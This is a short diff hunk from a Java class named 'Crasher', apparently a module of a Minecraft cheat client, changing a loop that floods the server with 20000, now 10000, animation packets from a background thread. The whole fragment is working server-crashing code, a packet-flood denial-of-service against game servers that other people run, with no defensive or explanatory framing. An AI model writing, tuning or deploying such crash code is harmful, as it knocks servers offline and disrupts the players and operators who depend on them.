@@ -23,7 +23,7 @@ public class Crasher extends Module {
 			
 			@Override
 			public void run() {
-				for (int i=0;i<20000;i++)
+				for (int i=0;i<10000;i++)
 					mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
 			}
 		}).start();
